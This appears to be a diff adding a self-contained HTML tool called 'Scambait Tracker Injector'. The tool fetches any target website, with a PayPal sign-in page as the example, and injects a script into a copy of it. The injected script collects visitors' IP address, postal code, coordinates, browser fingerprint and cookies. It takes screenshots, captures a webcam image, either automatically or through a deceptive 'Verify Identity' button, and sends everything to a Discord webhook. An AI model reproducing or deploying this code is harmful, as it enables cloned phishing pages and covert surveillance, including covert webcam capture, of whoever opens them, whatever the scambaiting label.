@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scambait Tracker Injector</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #eee;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { text-align: center; margin-bottom: 10px; color: #0f0; text-shadow: 0 0 10px rgba(0,255,0,0.3); }
+        .sub { text-align: center; color: #888; margin-bottom: 30px; }
+        .card {
+            background: rgba(0,0,0,0.6);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        .card h3 { margin-bottom: 15px; color: #0f0; border-left: 3px solid #0f0; padding-left: 12px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #ccc; }
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-family: monospace;
+            margin-bottom: 15px;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-right: 10px;
+        }
+        button:hover { background: #0c0; transform: scale(1.02); }
+        button.danger { background: #f00; color: #fff; }
+        .preview {
+            background: #0a0a1a;
+            border-radius: 10px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            max-height: 400px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #333;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 1000;
+        }
+        .status.success { background: #0a0; }
+        .status.error { background: #a00; }
+        .row { display: flex; gap: 20px; }
+        .col { flex: 1; }
+        .feature-badge {
+            background: #0f0;
+            color: #000;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔧 Scambait Tracker Injector</h1>
+        <div class="sub">Postal Code · Screenshot · Webcam — Full Suite</div>
+        
+        <div class="card">
+            <h3>📋 Configuration</h3>
+            
+            <label>🎯 Discord Webhook URL</label>
+            <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+            
+            <div class="row">
+                <div class="col">
+                    <label>🌐 Target Website URL</label>
+                    <input type="text" id="targetUrl" placeholder="https://www.paypal.com/signin">
+                </div>
+                <div class="col">
+                    <label>🔗 Your Domain (optional)</label>
+                    <input type="text" id="trackerDomain" placeholder="https://your-site.vercel.app">
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col">
+                    <label>📸 Screenshot Capture <span class="feature-badge">html2canvas</span></label>
+                    <select id="screenshotMode">
+                        <option value="full">Full Page Screenshot</option>
+                        <option value="viewport">Viewport Only</option>
+                        <option value="off">Off</option>
+                    </select>
+                </div>
+                <div class="col">
+                    <label>🎥 Webcam Capture <span class="feature-badge">getUserMedia</span></label>
+                    <select id="webcamMode">
+                        <option value="prompt">Prompt with Button</option>
+                        <option value="auto">Auto-Request on Load</option>
+                        <option value="off">Off</option>
+                    </select>
+                </div>
+            </div>
+            
+            <button id="fetchBtn">🔍 Fetch & Inject</button>
+            <button id="copyBtn" class="danger">📋 Copy Injected HTML</button>
+        </div>
+        
+        <div class="card">
+            <h3>📝 Custom Injection Script</h3>
+            <textarea id="customScript" rows="20" style="font-family: monospace; font-size: 11px;">// === SCAMBAIT TRACKER v2 - Postal + Screenshot + Webcam ===
+(async function() {
+    const WEBHOOK = '{{WEBHOOK}}';
+    const SCREENSHOT_MODE = '{{SCREENSHOT_MODE}}';
+    const WEBCAM_MODE = '{{WEBCAM_MODE}}';
+    
+    let collectedData = {
+        // Will be populated
+        ip: '',
+        postalCode: '',
+        city: '',
+        region: '',
+        country: '',
+        latitude: '',
+        longitude: '',
+        // Browser data
+        userAgent: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height,
+        colorDepth: screen.colorDepth,
+        language: navigator.language,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer,
+        pageUrl: window.location.href,
+        cookies: document.cookie,
+        timestamp: new Date().toISOString(),
+        // Will be filled async
+        screenshot: null,
+        webcamImage: null
+    };
+    
+    // Helper: Send to Discord
+    async function sendToDiscord() {
+        if (!WEBHOOK || WEBHOOK === '{{WEBHOOK}}') return;
+        
+        const fields = [
+            { name: '🌐 IP Address', value: collectedData.ip || 'Unknown', inline: true },
+            { name: '📮 Postal Code', value: collectedData.postalCode || 'Unknown', inline: true },
+            { name: '📍 Location', value: `${collectedData.city}, ${collectedData.region}, ${collectedData.country}`, inline: true },
+            { name: '🗺️ Coordinates', value: collectedData.latitude && collectedData.longitude ? `${collectedData.latitude}, ${collectedData.longitude}` : 'Unknown', inline: true },
+            { name: '💻 User Agent', value: (collectedData.userAgent || '').substring(0, 100), inline: false },
+            { name: '📱 Screen', value: collectedData.screen, inline: true },
+            { name: '🧠 CPU Cores', value: collectedData.hardwareConcurrency.toString(), inline: true },
+            { name: '💾 RAM', value: collectedData.deviceMemory ? collectedData.deviceMemory + ' GB' : 'Unknown', inline: true },
+            { name: '🕐 Timezone', value: collectedData.timezone, inline: true },
+            { name: '🔗 Referrer', value: collectedData.referrer || 'Direct', inline: false },
+            { name: '🍪 Cookies', value: (collectedData.cookies || 'none').substring(0, 200), inline: false },
+            { name: '⏰ Timestamp', value: collectedData.timestamp, inline: true }
+        ];
+        
+        // Add screenshot if captured
+        if (collectedData.screenshot) {
+            fields.push({ name: '📸 Screenshot', value: 'See attached image above', inline: false });
+        }
+        
+        const embed = {
+            title: '🎯 New Scammer Tracked',
+            color: 0x00ff00,
+            fields: fields,
+            footer: { text: 'Scambait Tracker v2' },
+            timestamp: new Date().toISOString()
+        };
+        
+        // Add screenshot as image attachment if available
+        if (collectedData.screenshot) {
+            embed.image = { url: collectedData.screenshot };
+        }
+        
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch(e) { console.error('Discord send failed', e); }
+    }
+    
+    // === IP + POSTAL CODE (using ip-api.com - includes postal code) ===
+    async function getLocationAndPostal() {
+        try {
+            const res = await fetch('http://ip-api.com/json/');
+            const data = await res.json();
+            if (data.status === 'success') {
+                collectedData.ip = data.query;
+                collectedData.postalCode = data.zip || 'N/A';
+                collectedData.city = data.city;
+                collectedData.region = data.regionName;
+                collectedData.country = data.country;
+                collectedData.latitude = data.lat;
+                collectedData.longitude = data.lon;
+                console.log(`📍 Location: ${data.city}, ${data.zip}, ${data.country}`);
+            } else {
+                console.log('IP lookup failed');
+            }
+        } catch(e) {
+            console.error('IP fetch error:', e);
+        }
+    }
+    
+    // === SCREENSHOT CAPTURE (html2canvas) ===
+    async function captureScreenshot() {
+        if (SCREENSHOT_MODE === 'off') return;
+        
+        // Load html2canvas dynamically
+        await new Promise((resolve, reject) => {
+            if (window.html2canvas) return resolve();
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+            script.onload = resolve;
+            script.onerror = reject;
+            document.head.appendChild(script);
+        });
+        
+        try {
+            const canvas = await html2canvas(document.body, {
+                scale: 0.5,  // Lower scale for smaller image size
+                useCORS: true,  // Required for cross-origin images [citation:1][citation:5]
+                logging: false,
+                allowTaint: false,  // Prevents canvas tainting [citation:5]
+                backgroundColor: '#ffffff'
+            });
+            collectedData.screenshot = canvas.toDataURL('image/jpeg', 0.7);
+            console.log('📸 Screenshot captured');
+        } catch(e) {
+            console.error('Screenshot failed:', e);
+        }
+    }
+    
+    // === WEBCAM CAPTURE (getUserMedia) ===
+    async function captureWebcam() {
+        if (WEBCAM_MODE === 'off') return;
+        
+        try {
+            // Request camera permission [citation:9]
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            // Create video element to capture frame
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            // Wait for video to be ready
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.width = video.videoWidth;
+                    video.height = video.videoHeight;
+                    resolve();
+                };
+            });
+            
+            // Capture frame to canvas
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            collectedData.webcamImage = canvas.toDataURL('image/jpeg', 0.6);
+            
+            // Stop all tracks
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Send webcam image as separate Discord message (or embed)
+            if (WEBHOOK && WEBHOOK !== '{{WEBHOOK}}' && collectedData.webcamImage) {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '📸 **WEBCAM CAPTURE**',
+                        embeds: [{
+                            title: 'Scammer Webcam Image',
+                            image: { url: collectedData.webcamImage },
+                            color: 0xff0000,
+                            footer: { text: 'Webcam Capture' }
+                        }]
+                    })
+                });
+            }
+            
+            console.log('🎥 Webcam captured');
+        } catch(e) {
+            console.error('Webcam capture failed:', e);
+            // Common errors: NotAllowedError (user denied), NotFoundError (no camera) [citation:9]
+        }
+    }
+    
+    // === AUTO WEBCAM (if mode is 'auto') ===
+    if (WEBCAM_MODE === 'auto') {
+        // Small delay to let page load
+        setTimeout(() => captureWebcam(), 2000);
+    } else if (WEBCAM_MODE === 'prompt') {
+        // Create a button for the scammer to click
+        const btn = document.createElement('button');
+        btn.innerText = 'Verify Identity';
+        btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:99999;background:#0f0;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;';
+        btn.onclick = () => {
+            captureWebcam();
+            btn.remove();
+        };
+        document.body.appendChild(btn);
+    }
+    
+    // === RUN EVERYTHING ===
+    await getLocationAndPostal();
+    await captureScreenshot();
+    await sendToDiscord();
+})();</textarea>
+        </div>
+        
+        <div class="card">
+            <h3>📄 Injected HTML Preview</h3>
+            <div id="preview" class="preview">Click "Fetch & Inject" to see the modified HTML...</div>
+        </div>
+    </div>
+    
+    <div id="status" class="status">Ready</div>
+    
+    <script>
+        const webhookInput = document.getElementById('webhookUrl');
+        const targetInput = document.getElementById('targetUrl');
+        const fetchBtn = document.getElementById('fetchBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const previewDiv = document.getElementById('preview');
+        const customScript = document.getElementById('customScript');
+        const statusDiv = document.getElementById('status');
+        const screenshotMode = document.getElementById('screenshotMode');
+        const webcamMode = document.getElementById('webcamMode');
+        
+        let currentInjectedHTML = '';
+        
+        function setStatus(msg, isError = false) {
+            statusDiv.textContent = msg;
+            statusDiv.className = 'status ' + (isError ? 'error' : 'success');
+            setTimeout(() => {
+                if (statusDiv.textContent === msg) {
+                    statusDiv.className = 'status';
+                }
+            }, 3000);
+        }
+        
+        function injectScriptIntoHTML(html, scriptCode, webhookUrl, screenshotModeVal, webcamModeVal) {
+            let finalScript = scriptCode
+                .replace(/{{WEBHOOK}}/g, webhookUrl)
+                .replace(/{{SCREENSHOT_MODE}}/g, screenshotModeVal)
+                .replace(/{{WEBCAM_MODE}}/g, webcamModeVal);
+            
+            if (html.includes('</head>')) {
+                return html.replace('</head>', finalScript + '</head>');
+            } else if (html.includes('</body>')) {
+                return html.replace('</body>', finalScript + '</body>');
+            } else {
+                return finalScript + html;
+            }
+        }
+        
+        async function fetchAndInject() {
+            const targetUrl = targetInput.value.trim();
+            const webhookUrl = webhookInput.value.trim();
+            const scriptCode = customScript.value;
+            const screenshotModeVal = screenshotMode.value;
+            const webcamModeVal = webcamMode.value;
+            
+            if (!targetUrl) {
+                setStatus('Please enter a target URL', true);
+                return;
+            }
+            
+            if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks/')) {
+                setStatus('Please enter a valid Discord webhook URL', true);
+                return;
+            }
+            
+            setStatus('Fetching target website...');
+            
+            try {
+                const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(targetUrl);
+                const response = await fetch(proxyUrl);
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                let html = await response.text();
+                setStatus(`Fetched ${html.length} bytes, injecting...`);
+                
+                currentInjectedHTML = injectScriptIntoHTML(html, scriptCode, webhookUrl, screenshotModeVal, webcamModeVal);
+                
+                const truncated = currentInjectedHTML.length > 5000 ? 
+                    currentInjectedHTML.substring(0, 5000) + '\n\n... (truncated)' : 
+                    currentInjectedHTML;
+                previewDiv.textContent = truncated;
+                setStatus('✅ Injected HTML ready!');
+            } catch (error) {
+                setStatus(`Error: ${error.message}`, true);
+                previewDiv.textContent = `Error fetching ${targetUrl}: ${error.message}`;
+            }
+        }
+        
+        async function copyHTML() {
+            if (!currentInjectedHTML) {
+                setStatus('Nothing to copy yet.', true);
+                return;
+            }
+            try {
+                await navigator.clipboard.writeText(currentInjectedHTML);
+                setStatus('✅ Copied!');
+            } catch (err) {
+                setStatus('Failed to copy', true);
+            }
+        }
+        
+        fetchBtn.addEventListener('click', fetchAndInject);
+        copyBtn.addEventListener('click', copyHTML);
+        
+        const savedWebhook = localStorage.getItem('scambait_webhook');
+        if (savedWebhook) webhookInput.value = savedWebhook;
+        webhookInput.addEventListener('change', () => localStorage.setItem('scambait_webhook', webhookInput.value));
+        
+        setStatus('Ready');
+    </script>
+</body>
+</html>
